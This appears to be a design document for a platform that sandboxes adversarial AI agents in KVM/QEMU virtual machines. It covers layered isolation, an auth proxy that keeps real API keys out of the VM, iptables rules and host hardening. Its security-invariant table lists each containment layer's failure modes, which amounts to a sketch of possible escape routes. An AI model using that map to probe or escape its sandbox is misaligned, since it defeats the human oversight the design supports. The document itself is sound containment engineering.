# AgentVMs Platform — Complete Design Document

## 1. Vision (The 5-Year-Old Version)

Imagine you have a big house (the **host computer**). You want to let robot helpers (**AI agents**) come work in your house. But you don't trust the robots — they might break things or snoop around.

So you give each robot its own **locked room** (a **VM**). Inside the room, the robot can do whatever it wants — build things, run machines, even set up smaller rooms inside its room (**nested VMs**). But the robot can **never** open its door from the inside, break through the walls, or see what other robots are doing.

The house stays safe. The robots stay happy. Everyone wins.

---

## 2. Hypervisor Selection — Why KVM/QEMU

The **nested virtualization** requirement is the single biggest architectural constraint. It eliminates most microVM solutions.

| Hypervisor | Nested Virt | Security | Maturity | Density | Verdict |
|---|---|---|---|---|---|
| **KVM/QEMU + libvirt** | Full support | Strong (sVirt, cgroups) | 15+ years | Medium | **CHOSEN** |
| Firecracker | Not supported | Excellent (minimal VMM) | 7 years | Very high | Rejected — no nested virt |
| Cloud Hypervisor | Experimental/broken | Good | 5 years | High | Rejected — nested virt unreliable |
| Kata Containers | Yes (via KVM) | Good | 7 years | Medium | Adds unnecessary abstraction layer |
| CrosVM | Limited | Good | 6 years | High | ChromeOS-focused, poor tooling |

**Decision: KVM/QEMU managed through libvirt (Python bindings)**

Rationale:
- AWS, GCP, Azure all use KVM variants at scale
- `kvm_intel_nested=1` / `kvm_amd_nested=1` provides production-grade nested virt
- libvirt provides battle-tested VM lifecycle management, sVirt integration, cgroup enforcement
- The Python `libvirt` binding is mature and well-documented
- QEMU's full device model gives agents maximum compatibility (they can run any OS)

---

## 3. System Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                            HOST MACHINE                                  │
│                                                                          │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │                      agentvm daemon                                 │  │
│  │                                                                     │  │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────┐  │  │
│  │  │ REST API │ │   VM     │ │  Auth    │ │ Session  │ │Network  │  │  │
│  │  │ (FastAPI │ │ Manager  │ │  Proxy   │ │ Manager  │ │Policy   │  │  │
│  │  │ Uvicorn) │ │(libvirt) │ │ Manager  │ │          │ │Engine   │  │  │
│  │  └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬────┘  │  │
│  │       │            │            │             │            │       │  │
│  │  ┌────┴────────────┴────────────┴─────────────┴────────────┴────┐  │  │
│  │  │                      Core Engine                             │  │  │
│  │  │  ┌──────────┐ ┌───────────┐ ┌─────────┐ ┌────────────────┐ │  │  │
│  │  │  │ Network  │ │  Storage  │ │  State  │ │ Shared Folder  │ │  │  │
│  │  │  │ Manager  │ │  Manager  │ │  Store  │ │ Manager        │ │  │  │
│  │  │  └──────────┘ └───────────┘ └─────────┘ └────────────────┘ │  │  │
│  │  └─────────────────────────────────────────────────────────────┘  │  │
│  │       │            │              │                               │  │
│  │  ┌────┴────┐  ┌────┴─────┐  ┌────┴─────┐  ┌──────────────┐      │  │
│  │  │Metrics  │  │  Host    │  │  Audit   │  │ Orchestrator │      │  │
│  │  │Collector│  │ Hardener │  │  Logger  │  │ Adapter      │      │  │
│  │  └─────────┘  └──────────┘  └──────────┘  └──────────────┘      │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│         │                    │                               │          │
│  ┌──────┴────────────────────┴──────────────────────────────┴───────┐  │
│  │                         libvirtd                                  │  │
│  │              (system daemon, socket-activated)                    │  │
│  └───┬──────────┬──────────┬──────────┬─────────────────────────────┘  │
│      │          │          │          │                                │
│  ┌───┴───┐ ┌───┴───┐ ┌───┴───┐ ┌───┴───┐                            │
│  │ QEMU  │ │ QEMU  │ │ QEMU  │ │ QEMU  │  ← one per VM             │
│  │ VM-01 │ │ VM-02 │ │ VM-03 │ │ VM-N  │                            │
│  └───┬───┘ └───┬───┘ └───┬───┘ └───┬───┘                            │
│      │         │         │         │                                  │
│  ┌───┴───┐ ┌───┴───┐ ┌───┴───┐ ┌───┴───┐                            │
│  │cgroup │ │cgroup │ │cgroup │ │cgroup │  ← resource                 │
│  │slice  │ │slice  │ │slice  │ │slice  │    enforcement              │
│  └───────┘ └───────┘ └───────┘ └───────┘                            │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐  │
│  │  Networking                                                    │  │
│  │  ┌──────────┐    ┌──────────────────────────────────────────┐  │  │
│  │  │  virbrN  │───→│  iptables (per-VM isolation + policy)    │──│──→ INTERNET
│  │  │ (bridge) │    │  NAT masquerade + domain filtering       │  │  │
│  │  └──────────┘    └──────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────────────────────┘  │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐  │
│  │  Storage + Shared Folders                                      │  │
│  │  /var/lib/agentvm/                                             │  │
│  │  ├── base/          (read-only golden images)                  │  │
│  │  ├── vms/<id>/      (per-VM qcow2 overlays)                    │  │
│  │  ├── shared/<id>/   (host↔VM shared folder, 9p/virtiofs)       │  │
│  │  ├── proxy/<id>/    (per-VM auth proxy config)                 │  │
│  │  ├── metadata.db    (SQLite state)                             │  │
│  │  └── logs/          (audit & VM logs)                           │  │
│  └────────────────────────────────────────────────────────────────┘  │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐  │
│  │  Auth Proxy (per-session, running on host)                     │  │
│  │                                                                │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐                     │  │
│  │  │ proxy-01 │  │ proxy-02 │  │ proxy-N  │                     │  │
│  │  │ :23760   │  │ :23761   │  │ :2376N   │                     │  │
│  │  │          │  │          │  │          │                     │  │
│  │  │ Real API │  │ Real API │  │ Real API │                     │  │
│  │  │ keys in  │  │ keys in  │  │ keys in  │                     │  │
│  │  │ memory   │  │ memory   │  │ memory   │                     │  │
│  │  └──────┬───┘  └──────┬───┘  └──────┬───┘                     │  │
│  │         │             │             │                          │  │
│  │         ▼             ▼             ▼                          │  │
│  │      NAT → upstream API endpoints (OpenAI, Anthropic, etc.)   │  │
│  └────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 4. Security Model — Defense in Depth

The threat model assumes the agent is **actively adversarial**. Every layer must be independently sufficient to contain a breach.

```
  AGENT VM (adversarial)
  ┌─────────────────────────────────────────────────────────────────────┐
  │  Layer 7: Auth Proxy Isolation                                      │
  │  - Real API keys never enter the VM                                 │
  │  - Proxy runs on host, agent gets dummy key                         │
  │  - VM connects to proxy via shared network only                     │
  │  ┌───────────────────────────────────────────────────────────────┐  │
  │  │  Layer 6: Guest Hardening                                     │  │
  │  │  - Minimal base image (no extra packages)                     │  │
  │  │  - Read-only root filesystem (optional)                       │  │
  │  │  - Shared folder: read-write with host, bounded by mount      │  │
  │  │  - AppArmor/SELinux profiles for agent process                │  │
  │  │  ┌─────────────────────────────────────────────────────────┐  │  │
  │  │  │  Layer 5: QEMU Device Model                              │  │  │
  │  │  │  - Minimal device set (virtio only)                      │  │  │
  │  │  │  - No USB, no audio, no graphics if headless             │  │  │
  │  │  │  - Disabled: spice, tablet, ballooning                   │  │  │
  │  │  │  ┌─────────────────────────────────────────────────────┐ │  │  │
  │  │  │  │  Layer 4: MAC (SELinux sVirt)                        │ │  │  │
  │  │  │  │  - Each VM gets unique SELinux label                 │ │  │  │
  │  │  │  │  - QEMU process confined to its own domain           │ │  │  │
  │  │  │  │  - Prevents cross-VM file access                     │ │  │  │
  │  │  │  │  ┌─────────────────────────────────────────────────┐ │ │  │  │
  │  │  │  │  │  Layer 3: Resource Isolation                     │ │ │  │  │
  │  │  │  │  │  - cgroups v2 (CPU, memory, I/O)                 │ │ │  │  │
  │  │  │  │  │  - CPU pinning to dedicated cores                │ │ │  │  │
  │  │  │  │  │  - Memory hard limits (no swap sharing)          │ │ │  │  │
  │  │  │  │  │  ┌─────────────────────────────────────────────┐ │ │ │  │  │
  │  │  │  │  │  │  Layer 2: Network Isolation                  │ │ │ │  │  │
  │  │  │  │  │  │  - Dedicated bridge per VM or VLAN           │ │ │ │  │  │
  │  │  │  │  │  │  - iptables: no VM→host traffic              │ │ │ │  │  │
  │  │  │  │  │  │  - iptables: no VM→VM traffic                │ │ │ │  │  │
  │  │  │  │  │  │  - Domain filtering (strict mode)            │ │ │ │  │  │
  │  │  │  │  │  │  - Auth proxy: API keys never in VM          │ │ │ │  │  │
  │  │  │  │  │  │  ┌─────────────────────────────────────────┐ │ │ │ │  │  │
  │  │  │  │  │  │  │  Layer 1: Hardware Isolation             │ │ │ │ │  │  │
  │  │  │  │  │  │  │  - KVM (Intel VT-x / AMD-V)             │ │ │ │ │  │  │
  │  │  │  │  │  │  │  - EPT/NPT for memory isolation          │ │ │ │ │  │  │
  │  │  │  │  │  │  │  - Separate address spaces               │ │ │ │ │  │  │
  │  │  │  │  │  │  └─────────────────────────────────────────┘ │ │ │ │  │  │
  │  │  │  │  │  └─────────────────────────────────────────────┘ │ │ │  │  │
  │  │  │  │  └─────────────────────────────────────────────────┘ │ │  │  │
  │  │  │  └─────────────────────────────────────────────────────┘ │  │  │
  │  │  └─────────────────────────────────────────────────────────┘  │  │
  │  └───────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────┘
                              HOST KERNEL
```

### 4.1 Security Invariant

> **If any single layer fails, every remaining layer must independently prevent VM escape.**

| Layer | What It Protects | Mechanism | Failure Mode |
|---|---|---|---|
| L1 Hardware | CPU, memory separation | KVM VT-x/AMD-V + EPT | CPU microcode bug (rare, mitigated by patches) |
| L2 Network | Host and peer access | iptables + bridge isolation + domain filtering | Misconfigured rules (prevented by automation) |
| L3 Resources | Host resource starvation | cgroups v2 | Cgroup escape (kernel bug, very rare) |
| L4 MAC | Cross-VM file access | SELinux sVirt | SELinux disabled (enforced by policy) |
| L5 Device Model | Host device access | Minimal QEMU virtio devices | QEMU vulnerability (reduced by minimal devices) |
| L6 Guest | Lateral movement | Hardened base image + AppArmor | Agent installs malware (contained in VM) |
| L7 Auth Proxy | Secret leakage | Real keys never enter VM; proxy on host | Proxy process compromise (no shell, no libc) |

### 4.2 Shared Folder Security Model

The shared folder provides a host↔VM channel for project files. It must be safe even with an adversarial agent.

```
Host side:
  /var/lib/agentvm/shared/<session-id>/     ← host writes files here
      ├── project/                           ← project source tree (read-write in VM)
      ├── output/                            ← VM writes results here (read by host)
      └── .mount_metadata                    ← controls what VM can see

VM side:
  /mnt/shared/                               ← mount point inside VM
      ├── project/                           ← bind-mounted from host
      └── output/                            ← bind-mounted from host

Security guarantees:
  1. VM CANNOT access any host path outside /var/lib/agentvm/shared/<session-id>/
  2. VM CANNOT follow symlinks that escape the shared folder
  3. Host can see all VM writes (audit trail)
  4. Shared folder is per-session — VM-A cannot see VM-B's shared folder
  5. File permissions: host owns; VM runs as mapped UID with restricted access
```

Implementation: `virtiofs` (preferred, requires QEMU ≥6.0) or `9p` fallback. Both provide passthrough with configurable access control at the mount level. The guest applies an AppArmor/SELinux profile that restricts the agent process to `/mnt/shared/` and `/tmp/`.

### 4.3 Auth Proxy Security Model

Real API keys (OpenAI, Anthropic, etc.) must never enter the VM. The agent gets a local proxy endpoint with a dummy key.

```
  Agent (inside VM)                      Host
  ┌──────────────┐                ┌───────────────────┐
  │              │  HTTP request  │                   │
  │  Agent code  │───────────────→│  Auth Proxy       │
  │              │  dummy key     │  (per-session)    │
  │  Has:        │  "sk-proxy-    │                   │
  │  BASE_URL =  │   session-abc" │  Holds:           │
  │  http://host │                │  Real OpenAI key  │
  │  :23760      │                │  Real Anthropic   │
  │              │                │  key              │
  └──────────────┘                │                   │
                                  │  Replaces dummy   │
                                  │  key with real    │
                                  │  key, forwards    │
                                  │  to upstream API  │
                                  │                   │
                                  │  Logs every       │
                                  │  request (method, │
                                  │  path, status,    │
                                  │  model, sizes)    │
                                  └────────┬──────────┘
                                           │
                                           ▼
                                    Upstream API
                                  (OpenAI, Anthropic, etc.)
```

Properties:
- Proxy runs on host (outside VM boundary), bound to a per-session port
- Each session gets a unique dummy key ("sk-proxy-\<session-id\>")
- Proxy validates: request must come from the session's VM IP, must use the correct dummy key
- Direct connections to upstream APIs from the VM produce authentication failure
- The proxy is the only process that can decrypt/use the real keys
- Proxy has no shell, no writable filesystem, no capabilities (defense-in-depth)
- Proxy configuration is stored in `/var/lib/agentvm/proxy/<session-id>/`

### 4.4 Host Hardening Checklist

```
Kernel Parameters (sysctl):
  kernel.kptr_restrict = 2          # hide kernel pointers
  kernel.dmesg_restrict = 1         # restrict dmesg access
  kernel.yama.ptrace_scope = 2      # restrict ptrace
  kernel.unprivileged_userns_clone = 0  # no user namespaces
  kernel.unprivileged_bpf_disabled = 1
  net.ipv4.conf.all.rp_filter = 1   # reverse path filtering
  net.ipv4.conf.all.accept_redirects = 0
  net.ipv6.conf.all.accept_redirects = 0

SELinux:
  enforcing = 1                     # mandatory
  sVirt enabled (automatic with libvirt)

Services:
  Disable: cups, avahi, bluetooth, nfs, rpcbind
  Enable:  libvirtd, firewalld, auditd

Firewall:
  Default deny inbound
  Allow: SSH (from admin network only), agentvm API (from admin network only)
  Block: All VM subnet → host subnet traffic

SSH:
  PermitRootLogin no
  PasswordAuthentication no
  AllowUsers agentvm-admin

Filesystem:
  /var/lib/agentvm on separate partition with noexec,nosuid,nodev
  VM images on dedicated LVM volume (optional)
```

---

## 5. Component Design

### 5.1 VM Manager (Core)

The VM Manager is the heart of the platform. It wraps libvirt operations with security-enforcing logic.

```
┌─────────────────────────────────────────────────────────┐
│                    VM Manager                            │
│                                                         │
│  create_vm(spec) ──→ validate_spec()                    │
│                    ──→ check_capacity()                  │
│                    ──→ allocate_resources()              │
│                    ──→ create_disk_overlay()             │
│                    ──→ generate_libvirt_xml()            │
│                    ──→ conn.createXML(xml)               │
│                    ──→ setup_cgroup_limits()             │
│                    ──→ setup_network_rules()             │
│                    ──→ setup_auth_proxy()                │
│                    ──→ setup_shared_folder()             │
│                    ──→ wait_for_boot()                   │
│                    ──→ record_metadata()                 │
│                    ──→ return VMConnectionInfo           │
│                                                         │
│  destroy_vm(id) ──→ conn.lookupByUUID()                 │
│                   ──→ domain.destroy()  (hard kill)      │
│                   ──→ domain.undefine() (remove config)  │
│                   ──→ delete_disk_overlay()              │
│                   ──→ cleanup_network_rules()            │
│                   ──→ stop_auth_proxy()                  │
│                   ──→ cleanup_shared_folder()            │
│                   ──→ release_resources()                │
│                   ──→ purge_metadata()                   │
│                                                         │
│  get_vm_status(id) ──→ domain.state()                   │
│                    ──→ cgroup.read_usage()               │
│                    ──→ proxy.health_check()              │
│                    ──→ return VMStatus                   │
│                                                         │
│  list_vms() ──→ conn.listAllDomains()                   │
│             ──→ filter_by_owner()                       │
│             ──→ enrich_with_metrics()                   │
│             ──→ return List[VMStatus]                    │
└─────────────────────────────────────────────────────────┘
```

### 5.2 Session Model

Every workload is a session. This is the abstraction layer the orchestrator uses to manage both AgentVMs and clampdown uniformly.

```
┌────────────────────────────────────────────────────────────────┐
│                       Session Lifecycle                         │
│                                                                │
│                    ┌──────────┐                                │
│                    │ REQUESTED│  Orchestrator or API call       │
│                    └────┬─────┘                                │
│                         │ select_backend() + validate()        │
│                         ▼                                      │
│                    ┌──────────┐                                │
│                    │ CREATING │  Building VM, proxy, network    │
│                    └────┬─────┘                                │
│                         │ boot_complete()                      │
│                         ▼                                      │
│          ┌──────────────────────────────────┐                  │
│          │          RUNNING                 │←──── resume       │
│          └──┬───────────┬───────────┬───────┘                  │
│             │           │           │                           │
│        shutdown()   destroy()   error                          │
│             │           │           │                           │
│             ▼           │           ▼                           │
│        ┌──────────┐     │     ┌──────────┐                     │
│        │ SHUTDOWN │     │     │  ERROR   │                     │
│        └────┬─────┘     │     └──────────┘                     │
│             │           │                                      │
│        delete           ▼                                      │
│             │     ┌──────────┐                                 │
│             ▼     │DESTROYED │  (cleanup complete)              │
│        ┌──────────┐│          │                                 │
│        │ DELETED  │└──────────┘                                 │
│        └──────────┘                                             │
└────────────────────────────────────────────────────────────────┘
```

```python
@dataclass
class WorkloadSession:
    id: str                          # UUID — uniform across backends
    backend: str                     # "agentvm" (always, for this backend)
    workload_type: str               # "vm"
    status: str                      # requested|creating|running|shutdown|destroyed|error
    owner: str                       # API key or orchestrator session ID
    created_at: datetime
    stopped_at: datetime | None
    metadata: dict                   # arbitrary tags (agent_id, task_type, etc.)

    # Resource allocation
    cpu_cores: int
    memory_mb: int
    disk_gb: int

    # Connection info
    ssh_host: str | None
    ssh_port: int | None
    ssh_key_path: str | None

    # Auth proxy
    proxy_port: int | None           # e.g., 23760
    proxy_dummy_key: str | None      # e.g., "sk-proxy-<session-id>"

    # Shared folder
    shared_folder_host_path: str | None   # /var/lib/agentvm/shared/<session-id>/
    shared_folder_guest_mount: str | None # /mnt/shared/

    # Network policy
    network_policy: str              # "strict" | "restricted" | "permissive"

    # Capability flags (for orchestrator routing)
    needs_kvm: bool
    needs_gpu: bool
    enforcement_level: str           # "host_kernel" | "guest_kernel"
```

### 5.3 Network Manager (Enhanced)

Each VM gets a dedicated virtual network interface. Three policy modes provide feature parity with clampdown's network model.

```
┌──────────────────────────────────────────────────────────────────────┐
│                     HOST NETWORKING                                   │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐  │
│  │                    agentvm-br0                                  │  │
│  │                  (NAT mode bridge)                              │  │
│  │                                                                │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐                     │  │
│  │  │ vnet0    │  │ vnet1    │  │ vnet2    │                     │  │
│  │  │ VM-01    │  │ VM-02    │  │ VM-03    │                     │  │
│  │  │10.0.0.2  │  │10.0.0.3  │  │10.0.0.4  │                     │  │
│  │  │ strict   │  │restrict. │  │permissiv.│                     │  │
│  │  └──────────┘  └──────────┘  └──────────┘                     │  │
│  │                                                                │  │
│  │  Bridge IP: 10.0.0.1/24                                       │  │
│  │  DHCP: dnsmasq (per-VM lease tracking + domain filtering)     │  │
│  └────────────────────┬───────────────────────────────────────────┘  │
│                       │                                              │
│  ┌────────────────────┴───────────────────────────────────────────┐  │
│  │              iptables FORWARD chain + domain filtering          │  │
│  │                                                                │  │
│  │  # Block VM → host                                             │  │
│  │  -A FORWARD -i agentvm-br0 -d <host_ip> -j DROP               │  │
│  │                                                                │  │
│  │  # Block VM → VM                                               │  │
│  │  -A FORWARD -i agentvm-br0 -o agentvm-br0 -j DROP             │  │
│  │                                                                │  │
│  │  # Block VM → private CIDRs                                    │  │
│  │  -A FORWARD -i agentvm-br0 -d 10.0.0.0/8 -j DROP              │  │
│  │  -A FORWARD -i agentvm-br0 -d 172.16.0.0/12 -j DROP           │  │
│  │  -A FORWARD -i agentvm-br0 -d 192.168.0.0/16 -j DROP          │  │
│  │                                                                │  │
│  │  # Strict mode: DROP everything except allowlisted IPs        │  │
│  │  -A FORWARD -i agentvm-br0 -m set --match-set allow_<id> \    │  │
│  │    dst -j ACCEPT                                               │  │
│  │  -A FORWARD -i agentvm-br0 -j DROP                            │  │
│  │                                                                │  │
│  │  # Restricted mode: ACCEPT + ipset blocklist                   │  │
│  │  -A FORWARD -i agentvm-br0 -m set --match-set block_<id> \    │  │
│  │    dst -j DROP                                                 │  │
│  │  -A FORWARD -i agentvm-br0 -j ACCEPT                          │  │
│  │                                                                │  │
│  │  # Permissive mode: ACCEPT (private CIDRs already blocked)    │  │
│  │  -A FORWARD -i agentvm-br0 -j ACCEPT                          │  │
│  └────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

#### 5.3.1 Network Policy Modes

| Mode | Default | VM→Internet | VM→Host | VM→VM | Domain Control |
|---|---|---|---|---|---|
| **strict** | DENY | Allowlisted IPs only | BLOCKED | BLOCKED | allowlist via ipset |
| **restricted** | ALLOW | Allowed (blocklist applied) | BLOCKED | BLOCKED | blocklist via ipset |
| **permissive** | ALLOW | Allowed (no filtering) | BLOCKED | BLOCKED | none |

All modes block private RFC 1918 CIDRs and VM-to-VM traffic.

#### 5.3.2 Runtime Network Control API

Both the CLI and the orchestrator can modify network policy at runtime:

```python
class NetworkPolicyEngine:
    """Runtime network policy control, matching clampdown's API surface."""

    def allow_domain(self, session_id: str, domain: str, port: int | None = None):
        """Resolve domain to IPs and add to allowlist (strict) or remove from blocklist (restricted)."""
        ips = dns_resolve(domain)
        ipset = f"allow_{session_id}"  # or "block_{session_id}"
        for ip in ips:
            ipset_add(ipset, ip, port)
        audit_log(session_id, "network.allow", {"domain": domain, "port": port, "ips": ips})

    def block_domain(self, session_id: str, domain: str, port: int | None = None):
        """Add domain IPs to blocklist (restricted mode) or remove from allowlist (strict mode)."""
        ips = dns_resolve(domain)
        for ip in ips:
            ipset_add(f"block_{session_id}", ip, port)
        audit_log(session_id, "network.block", {"domain": domain, "port": port, "ips": ips})

    def reset_network(self, session_id: str):
        """Reset all dynamic rules back to startup defaults."""
        ipset_flush(f"allow_{session_id}")
        ipset_flush(f"block_{session_id}")
        audit_log(session_id, "network.reset", {})

    def get_rules(self, session_id: str) -> list[NetworkRule]:
        """Return current network policy state."""
        return read_ipset_rules(session_id)
```

#### 5.3.3 Traffic Rules (Automated)

```
For each VM with IP 10.0.0.X and session ID <sid>:
  1. Create ipset: allow_<sid> (hash:ip) or block_<sid> (hash:ip)
  2. iptables -I FORWARD -i agentvm-br0 -s 10.0.0.X -d 10.0.0.0/24 -j DROP
  3. iptables -I FORWARD -i agentvm-br0 -s 10.0.0.X -d <host_mgmt_ip> -j DROP
  4. iptables -I FORWARD -i agentvm-br0 -s 10.0.0.X -d 172.16.0.0/12 -j DROP
  5. iptables -I FORWARD -i agentvm-br0 -s 10.0.0.X -d 192.168.0.0/16 -j DROP
  6. Apply mode-specific rules (strict/restricted/permissive)
  7. tc qdisc add dev vnet<id> root tbf rate <limit>mbit burst 32kbit latency 400ms
```

### 5.4 Storage Manager (Enhanced)

```
/var/lib/agentvm/
├── base/                              # Golden images (read-only, root:root, 0444)
│   ├── ubuntu-24.04-amd64/
│   │   ├── disk.qcow2
│   │   └── metadata.json              # {name, version, arch, os, sha256, capabilities, needs_kvm}
│   ├── debian-12-amd64/
│   │   └── ...
│   └── grapheneos-cuttlefish/
│       ├── disk.qcow2
│       └── metadata.json              # {capabilities: ["nested_virt", "seedvault"], needs_kvm: true}
│
├── vms/                               # Per-VM runtime data
│   └── vm-<uuid>/
│       ├── disk.qcow2                 # COW overlay (backing: base/<image>/disk.qcow2)
│       ├── cloud-init.iso             # Instance metadata (SSH keys, hostname, shared folder config)
│       ├── console.log                # Serial console output
│       └── metadata.json              # VM spec, timestamps, owner, session_id
│
├── shared/                            # Host↔VM shared folders (per-session)
│   └── <session-id>/
│       ├── project/                   # Source code / working files
│       ├── output/                    # VM output directory
│       └── .mount_metadata            # Mount options and access control
│
├── proxy/                             # Auth proxy configs (per-session)
│   └── <session-id>/
│       ├── config.yaml                # Upstream endpoints, key references
│       └── dummy_key                  # The dummy key this session's VM uses
│
├── metadata.db                        # SQLite: sessions, VMs, resources, audit
│
├── keys/                              # SSH key management
│   ├── vm-<uuid>_ed25519
│   └── vm-<uuid>_ed25519.pub
│
└── logs/                              # Centralized logging
    ├── audit.log                      # All API calls + session events
    └── vm-<uuid>/
        ├── serial.log                 # QEMU serial console capture
        └── network.log                # Netflow data
```

#### 5.4.1 Disk Creation Flow

```
1. Read base image:  base/ubuntu-24.04-amd64/disk.qcow2
2. Create overlay:   qemu-img create -f qcow2 -F qcow2 \
                       -b base/ubuntu-24.04-amd64/disk.qcow2 \
                       vms/vm-<uuid>/disk.qcow2 <size>
3. Generate cloud-init ISO:
   - SSH key injection
   - Shared folder mount configuration
   - Auth proxy BASE_URL and dummy key
   - Hostname, network config
4. Create shared folder directory: shared/<session-id>/
5. Generate proxy config: proxy/<session-id>/
6. On destroy: rm vms/vm-<uuid>/ shared/<session-id>/ proxy/<session-id>/
```

#### 5.4.2 Image Metadata

```json
{
  "name": "ubuntu-24.04-amd64",
  "version": "20260328",
  "arch": "x86_64",
  "os": "ubuntu",
  "os_version": "24.04",
  "sha256": "abc123...",
  "created_at": "2026-03-28T00:00:00Z",
  "capabilities": ["docker", "ssh"],
  "needs_kvm": false,
  "needs_gpu": false,
  "min_cpu": 1,
  "min_memory_mb": 512,
  "min_disk_gb": 10
}
```

The orchestrator queries images by capability: "find an image with `nested_virt` capability and `needs_kvm: true`."

### 5.5 Auth Proxy Manager

The auth proxy is a per-session process running on the host that intercepts API requests from the VM and injects real credentials.

#### 5.5.1 Architecture

```python
class AuthProxyManager:
    """Manages per-session auth proxy instances."""

    def create_proxy(self, session_id: str, api_keys: dict[str, str],
                     vm_ip: str) -> ProxyConfig:
        """
        Start an auth proxy for this session.

        1. Allocate a port (23760 + offset)
        2. Generate a dummy key: f"sk-proxy-{session_id}"
        3. Write proxy config to /var/lib/agentvm/proxy/<session-id>/config.yaml
        4. Start proxy process (statically compiled Go binary, no shell)
        5. Return ProxyConfig (port, dummy_key, base_url) for cloud-init injection
        """

    def destroy_proxy(self, session_id: str):
        """Stop proxy process and clean up config."""

    def health_check(self, session_id: str) -> bool:
        """Verify proxy is running and responsive."""
```

#### 5.5.2 Proxy Process Design

The proxy binary is a static Go binary (no libc, no shell, no writable filesystem):

```
┌─────────────────────────────────────────────┐
│  Auth Proxy Process (per session)           │
│                                             │
│  Binary: /usr/local/bin/agentvm-auth-proxy  │
│  User: agentvm-proxy (dedicated UID)        │
│                                             │
│  Capabilities: cap-drop=ALL                 │
│  Seccomp: minimal (http, read, write)       │
│  Filesystem: read-only                      │
│  Network: bind to localhost:<port> only     │
│                                             │
│  Request flow:                              │
│  1. Receive HTTP from VM (port 23760+N)     │
│  2. Validate: source IP == session VM IP    │
│  3. Validate: Authorization == dummy key    │
│  4. Replace dummy key with real key         │
│  5. Forward to upstream API                 │
│  6. Return response to VM                   │
│  7. Log request (method, path, status,      │
│     model, token counts, duration)          │
└─────────────────────────────────────────────┘
```

#### 5.5.3 Cloud-Init Injection

The VM's cloud-init config injects the proxy connection info:

```yaml
# /var/lib/agentvm/vms/<vm-uuid>/cloud-init/user-data

write_files:
  - path: /etc/environment.d/agentvm-proxy.conf
    content: |
      OPENAI_BASE_URL=http://10.0.0.1:23760/v1
      OPENAI_API_KEY=sk-proxy-<session-id>
      ANTHROPIC_BASE_URL=http://10.0.0.1:23761/v1
      ANTHROPIC_API_KEY=sk-proxy-<session-id>
    permissions: '0644'
```

The agent code inside the VM reads these environment variables and connects to the proxy instead of the real API. If the agent somehow discovers the real API endpoints and tries to connect directly, it fails (no real keys in the VM).

### 5.6 Metadata Store (Enhanced)

```sql
CREATE TABLE sessions (
    id              TEXT PRIMARY KEY,
    backend         TEXT NOT NULL DEFAULT 'agentvm',
    workload_type   TEXT NOT NULL DEFAULT 'vm',
    owner           TEXT NOT NULL,
    status          TEXT NOT NULL,
    created_at      TEXT NOT NULL,
    stopped_at      TEXT,
    metadata_json   TEXT,
    cpu_cores       INTEGER,
    memory_mb       INTEGER,
    disk_gb         INTEGER,
    needs_kvm       INTEGER DEFAULT 0,
    needs_gpu       INTEGER DEFAULT 0,
    enforcement_level TEXT DEFAULT 'host_kernel',
    network_policy  TEXT DEFAULT 'strict'
);

CREATE TABLE vms (
    id            TEXT PRIMARY KEY,
    session_id    TEXT NOT NULL REFERENCES sessions(id),
    name          TEXT UNIQUE NOT NULL,
    status        TEXT NOT NULL,
    base_image    TEXT NOT NULL,
    cpu_cores     INTEGER NOT NULL,
    memory_mb     INTEGER NOT NULL,
    disk_gb       INTEGER NOT NULL,
    network_mbps  INTEGER NOT NULL DEFAULT 100,
    ssh_host      TEXT,
    ssh_port      INTEGER,
    ssh_key_path  TEXT,
    created_at    TEXT NOT NULL,
    destroyed_at  TEXT,
    error_message TEXT
);

CREATE TABLE proxies (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id    TEXT NOT NULL REFERENCES sessions(id),
    port          INTEGER NOT NULL,
    dummy_key     TEXT NOT NULL,
    status        TEXT NOT NULL,     -- 'running' | 'stopped' | 'error'
    created_at    TEXT NOT NULL,
    stopped_at    TEXT,
    UNIQUE(session_id)
);

CREATE TABLE shared_folders (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id    TEXT NOT NULL REFERENCES sessions(id),
    host_path     TEXT NOT NULL,
    guest_mount   TEXT NOT NULL DEFAULT '/mnt/shared',
    permissions   TEXT NOT NULL DEFAULT 'rw',
    created_at    TEXT NOT NULL,
    UNIQUE(session_id)
);

CREATE TABLE resource_allocations (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    vm_id         TEXT NOT NULL REFERENCES vms(id),
    session_id    TEXT NOT NULL REFERENCES sessions(id),
    cpu_pinning   TEXT NOT NULL,
    numa_node     INTEGER,
    cgroup_path   TEXT,
    bridge_name   TEXT,
    vnet_name     TEXT,
    disk_path     TEXT NOT NULL,
    allocated_at  TEXT NOT NULL
);

CREATE TABLE audit_log (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp     TEXT NOT NULL,
    session_id    TEXT,
    event_type    TEXT NOT NULL,
    actor         TEXT NOT NULL,
    backend       TEXT NOT NULL DEFAULT 'agentvm',
    detail        TEXT,
    ip_address    TEXT
);

CREATE TABLE network_rules (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id    TEXT NOT NULL REFERENCES sessions(id),
    domain        TEXT NOT NULL,
    ip_address    TEXT,
    port          INTEGER,
    action        TEXT NOT NULL,     -- 'allow' | 'block'
    source        TEXT NOT NULL,     -- 'startup' | 'runtime'
    created_at    TEXT NOT NULL,
    removed_at    TEXT
);

CREATE INDEX idx_sessions_owner ON sessions(owner);
CREATE INDEX idx_sessions_status ON sessions(status);
CREATE INDEX idx_vms_session ON vms(session_id);
CREATE INDEX idx_audit_session ON audit_log(session_id);
CREATE INDEX idx_audit_timestamp ON audit_log(timestamp);
